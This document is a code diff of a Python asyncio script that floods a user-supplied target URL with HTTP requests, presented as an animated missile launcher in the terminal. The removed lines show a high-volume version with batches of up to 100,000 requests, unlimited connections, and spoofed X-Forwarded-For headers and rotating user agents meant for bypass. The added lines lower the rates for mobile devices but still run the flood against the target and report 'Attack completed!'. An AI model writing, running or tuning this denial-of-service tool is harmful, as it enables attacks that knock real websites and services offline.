@@ -2,7 +2,6 @@ import asyncio
 import aiohttp
 import random
 import time
-import os
 import shutil
 
 # Terminal size
@@ -23,7 +22,7 @@ async def countdown_loader(seconds):
     for i in range(seconds, 0, -1):
         clear()
         print(f"SG - RELOADING | {i}s")
-        for _ in range(5):
+        for _ in range(3):  # Reduced from 5
             print(random_ip())
         await asyncio.sleep(1)
 
@@ -40,43 +39,20 @@ MISSILE_BODY = [
 EXHAUST_FRAMES = [
     "\033[31m ^^^ \033[0m",
     "\033[33m *** \033[0m",
-    "\033[91m !!! \033[0m",
-    "\033[93m ::: \033[0m"
+    "\033[91m !!! \033[0m"
 ]
 
-# Maximum batch sizes for each missile type (optimized for Termux)
+# SAFE batch sizes for mobile devices
 MISSILE_BASE_SIZES = {
-    1: 2000,   # Light missile - high frequency
-    2: 5000,   # Medium missile
-    3: 10000,  # Heavy missile
-    4: 20000,  # Super missile
-    5: 50000   # Ultra missile - maximum power
+    1: 50,    # Light missile - safe for mobile
+    2: 100,   # Medium missile
+    3: 200,   # Heavy missile
+    4: 300,   # Super missile
+    5: 500    # Ultra missile - maximum safe for mobile
 }
 
-# Global request counter and performance tracking
+# Global request counter (lightweight)
 total_requests = 0
-requests_lock = asyncio.Lock()
-performance_factor = 1.0
-
-# Adaptive batch sizing based on recent performance
-async def get_dynamic_batch_size(missile_type):
-    global performance_factor
-    
-    base_size = MISSILE_BASE_SIZES.get(missile_type, 1000)
-    
-    # Adjust based on performance factor (starts at 1.0)
-    dynamic_size = int(base_size * performance_factor)
-    
-    # Cap sizes to prevent memory issues
-    max_sizes = {
-        1: 5000,
-        2: 15000,
-        3: 30000,
-        4: 60000,
-        5: 100000
-    }
-    
-    return min(dynamic_size, max_sizes[missile_type])
 
 class Missile:
     def __init__(self, speed=None):
@@ -88,14 +64,12 @@ class Missile:
         else:
             self.speed = random.choice([1, 2, 3, 4, 5])
         
-        self.batch = MISSILE_BASE_SIZES.get(self.speed, 1000)
+        self.batch = MISSILE_BASE_SIZES.get(self.speed, 50)
         self.x = TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2
         self.y = TERMINAL_HEIGHT
         self.active = False
-        self.launch_delay = random.uniform(0.3, 1.5)  # Much faster launches
+        self.launch_delay = random.uniform(2, 5)  # Slower launches to reduce load
         self.exhaust = random.choice(EXHAUST_FRAMES)
-        self.requests_sent = 0
-        self.last_batch_time = 0
 
     def move(self):
         if self.active:
@@ -104,195 +78,165 @@ class Missile:
                 self.reset()
                 self.active = False
 
-# Draw missiles with dynamic batch sizes
+# Draw missiles (simplified)
 def draw_missiles(missiles):
-    global total_requests, performance_factor
-    
     buffer = [""] * TERMINAL_HEIGHT
     
-    # System info at top (simplified without psutil)
-    buffer[0] = f"PERF: {performance_factor:.1f}x | TOTAL REQUESTS: {total_requests}"
-    buffer[1] = "=" * TERMINAL_WIDTH
+    # Simple header
+    buffer[0] = f"MOBILE MODE | REQUESTS: {total_requests}"
+    buffer[1] = "=" * min(TERMINAL_WIDTH, 40)
     
     for missile in missiles:
         if missile.active:
             for i, line in enumerate(MISSILE_BODY):
-                pos = missile.y - len(MISSILE_BODY) + i + 2  # Offset for system info
+                pos = missile.y - len(MISSILE_BODY) + i + 2
                 if 0 <= pos < TERMINAL_HEIGHT:
                     if i == 0:
-                        buffer[pos] += " " * missile.x + line + f"  [T{missile.speed}:{missile.batch}]"
+                        buffer[pos] += " " * missile.x + line + f"  [{missile.batch}]"
                     else:
                         buffer[pos] += " " * missile.x + line
-            exhaust_pos = missile.y + 2  # Offset for system info
+            exhaust_pos = missile.y + 2
             if 0 <= exhaust_pos < TERMINAL_HEIGHT:
-                buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
+                buffer[exhaust_pos] += " " * missile.x + missile.exhaust
     
     clear()
-    print("\n".join(buffer))
+    # Only print visible lines to reduce CPU
+    for line in buffer:
+        if line.strip():
+            print(line)
 
-# Minimal headers for bypass
+# Simple headers
 def get_headers():
-    headers_list = [
-        {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': '*/*',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Cache-Control': 'no-cache'
-        },
-        {
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Connection': 'keep-alive'
-        },
-        {
-            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
-            'Accept': '*/*',
-            'Connection': 'keep-alive'
-        }
-    ]
-    return random.choice(headers_list)
+    return {
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36',
+        'Accept': '*/*',
+        'Connection': 'keep-alive'
+    }
 
-# Send batch requests with maximum efficiency
-async def send_requests(target, batch, missile=None):
-    global total_requests, performance_factor
+# SAFE request function with limits
+async def send_requests(target, batch):
+    global total_requests
     
-    connector = aiohttp.TCPConnector(limit=0, verify_ssl=False, use_dns_cache=True)
-    timeout = aiohttp.ClientTimeout(total=10)  # Shorter timeout for faster cycles
+    # Mobile-safe connector with limits
+    connector = aiohttp.TCPConnector(limit=10, limit_per_host=5)  # Reduced limits
     
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        tasks = []
-        for i in range(batch):
-            try:
-                headers = get_headers()
-                # Add some variation to headers
-                if i % 3 == 0:
-                    headers['X-Forwarded-For'] = random_ip()
-                elif i % 5 == 0:
-                    headers['X-Real-IP'] = random_ip()
+    timeout = aiohttp.ClientTimeout(total=15)
+    
+    try:
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            # Process in smaller chunks for mobile safety
+            CHUNK_SIZE = 25  # Small chunks to avoid memory issues
+            successful = 0
+            
+            for chunk_start in range(0, batch, CHUNK_SIZE):
+                chunk_end = min(chunk_start + CHUNK_SIZE, batch)
+                chunk_size = chunk_end - chunk_start
                 
-                task = session.get(
-                    target, 
-                    headers=headers,
-                    allow_redirects=True, 
-                    ssl=False,
-                    skip_auto_headers=['Accept-Encoding']  # Reduce overhead
-                )
-                tasks.append(task)
-            except Exception as e:
-                continue
-        
-        try:
-            responses = await asyncio.gather(*tasks, return_exceptions=True)
-            successful = sum(1 for r in responses if not isinstance(r, Exception))
+                tasks = []
+                for i in range(chunk_size):
+                    try:
+                        task = session.get(
+                            target, 
+                            headers=get_headers(),
+                            allow_redirects=True, 
+                            ssl=False
+                        )
+                        tasks.append(task)
+                    except:
+                        continue
+                
+                if tasks:
+                    try:
+                        responses = await asyncio.gather(*tasks, return_exceptions=True)
+                        successful += sum(1 for r in responses if not isinstance(r, Exception))
+                    except:
+                        pass
+                
+                # Small delay between chunks to prevent overheating
+                await asyncio.sleep(0.1)
             
-            async with requests_lock:
-                total_requests += successful
-            
-            if missile:
-                missile.requests_sent += successful
-            
-            # Adaptive performance adjustment
-            success_rate = successful / batch if batch > 0 else 0
-            if success_rate > 0.8:
-                # Increase performance factor if we're doing well
-                performance_factor = min(performance_factor * 1.1, 3.0)
-            elif success_rate < 0.3:
-                # Decrease if we're struggling
-                performance_factor = max(performance_factor * 0.9, 0.5)
-            
+            total_requests += successful
             return successful
-        except Exception as e:
-            # Decrease performance factor on exception
-            performance_factor = max(performance_factor * 0.8, 0.5)
-            return 0
+            
+    except Exception as e:
+        return 0
 
-# Continuous attack functions for each missile type
+# Mobile-safe continuous attacks
 async def send_continuous_requests(target, missile):
-    global performance_factor
-    
-    missile.requests_sent = 0
-    flight_time = (TERMINAL_HEIGHT + len(MISSILE_BODY)) / missile.speed * 0.05
+    flight_time = (TERMINAL_HEIGHT + len(MISSILE_BODY)) / missile.speed * 0.1  # Slower
     
     start_time = time.time()
+    requests_sent = 0
     
     while time.time() - start_time < flight_time and missile.active:
-        # Get dynamic batch size based on current performance
-        missile.batch = int(MISSILE_BASE_SIZES[missile.speed] * performance_factor)
+        # Mobile-safe batch sizes
+        safe_batch = min(missile.batch, 100)
+        successful = await send_requests(target, safe_batch)
+        requests_sent += successful
         
-        # Send requests based on missile type with optimized intervals
-        intervals = {
-            1: 0.001,  # 1ms - high frequency
-            2: 0.002,  # 2ms
-            3: 0.003,  # 3ms
-            4: 0.005,  # 5ms
-            5: 0.008   # 8ms - larger batches
-        }
-        
-        interval = intervals[missile.speed]
-        batch_size = min(missile.batch, 10000)  # Cap single batch size
-        
-        batch_start = time.time()
-        successful = await send_requests(target, batch_size, missile)
-        
-        # Adaptive timing
-        batch_duration = time.time() - batch_start
-        sleep_time = max(0.0001, interval - batch_duration)  # Minimum 0.1ms sleep
-        await asyncio.sleep(sleep_time)
+        # Longer delays for mobile safety
+        intervals = {1: 0.5, 2: 0.4, 3: 0.3, 4: 0.2, 5: 0.1}
+        await asyncio.sleep(intervals[missile.speed])
 
-# Special attack modes - MAXIMUM POWER
+# Mobile-safe special attacks
 async def ultra_super_missile(target, duration):
     start_time = time.time()
-    while time.time() - start_time < duration:
-        batch = 50000  # Massive batches
-        asyncio.create_task(send_requests(target, batch))
-        await asyncio.sleep(1)  # Very frequent
+    attack_count = 0
+    max_attacks = duration // 10  # Limit total attacks
+    
+    while time.time() - start_time < duration and attack_count < max_attacks:
+        await send_requests(target, 200)  # Safe batch size
+        attack_count += 1
+        await asyncio.sleep(10)  # Less frequent
 
 async def last_missile(target, duration):
     start_time = time.time()
     while time.time() - start_time < duration:
-        batch = 20000  # Large frequent batches
-        asyncio.create_task(send_requests(target, batch))
-        await asyncio.sleep(0.05)  # Extremely frequent
+        await send_requests(target, 50)  # Small batches
+        await asyncio.sleep(2)  # Less frequent
 
 async def supernova_missile(target, duration):
     start_time = time.time()
-    while time.time() - start_time < duration:
-        delay = random.uniform(1, 3)  # Very frequent supernovas
-        await asyncio.sleep(delay)
-
-        # Massive initial burst
-        initial_batch = 100000
-        asyncio.create_task(send_requests(target, initial_batch))
-
-        # Continuous ultra-high frequency stream
-        async def stream():
-            t_end = time.time() + 5  # Longer stream
-            while time.time() < t_end:
-                asyncio.create_task(send_requests(target, 5000))
-                await asyncio.sleep(0.0001)  # Ultra high frequency
-        asyncio.create_task(stream())
-
-# Main loop
-async def main():
-    global total_requests, performance_factor
+    supernova_count = 0
+    max_supernovas = 3  # Very limited for mobile
     
-    target = input("¿TARGZ > ")
-    duration = int(input("¿DU > "))
+    while time.time() - start_time < duration and supernova_count < max_supernovas:
+        delay = random.uniform(15, 30)  # Much less frequent
+        await asyncio.sleep(delay)
+        
+        await send_requests(target, 100)  # Small supernova
+        supernova_count += 1
 
-    await countdown_loader(5)
+# Main loop - MOBILE SAFE
+async def main():
+    global total_requests
+    
+    print("=== MOBILE-SAFE MODE ===")
+    print("Reduced load to prevent crashes")
+    print("=" * 30)
+    
+    target = input("TARGET > ")
+    duration = int(input("DURATION (seconds) > "))
+    
+    if duration > 300:  # Cap duration for mobile
+        print("Duration capped at 300 seconds for mobile safety")
+        duration = 300
+    
+    await countdown_loader(3)  # Shorter countdown
 
-    # Create missiles of all types
-    missiles = [Missile(i+1) for i in range(5)]  # One of each type
-
-    # Start special attack modes
+    # Only 2 missiles instead of 5 for mobile
+    missiles = [Missile(1), Missile(3)]  # Light and heavy only
+    
+    # Start limited special attacks
     asyncio.create_task(ultra_super_missile(target, duration))
     asyncio.create_task(last_missile(target, duration))
     asyncio.create_task(supernova_missile(target, duration))
 
     start_time = time.time()
     last_launch_times = [0] * len(missiles)
+    
+    # Reduced frame rate for mobile
+    frame_count = 0
 
     while time.time() - start_time < duration:
         now = time.time()
@@ -300,20 +244,30 @@ async def main():
             if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                 missile.active = True
                 last_launch_times[idx] = now
-                
-                # Update batch size based on current performance
-                missile.batch = int(MISSILE_BASE_SIZES[missile.speed] * performance_factor)
-                
-                # All missiles use continuous attack
                 asyncio.create_task(send_continuous_requests(target, missile))
             
             missile.move()
         
-        draw_missiles(missiles)
-        await asyncio.sleep(0.02)  # Very fast update for maximum performance
+        # Only draw every 3rd frame to reduce CPU
+        frame_count += 1
+        if frame_count % 3 == 0:
+            draw_missiles(missiles)
+            frame_count = 0
+        
+        # Longer sleep to reduce CPU usage
+        await asyncio.sleep(0.2)
+
+    print(f"\nAttack completed! Total requests: {total_requests}")
 
 if __name__ == "__main__":
     try:
+        # Set lower priority for mobile safety
+        import os
+        os.nice(10)  # Lower priority if available
+        
         asyncio.run(main())
     except KeyboardInterrupt:
         clear()
+        print("Attack stopped by user")
+    except Exception as e:
+        print(f"Safe exit: {e}")
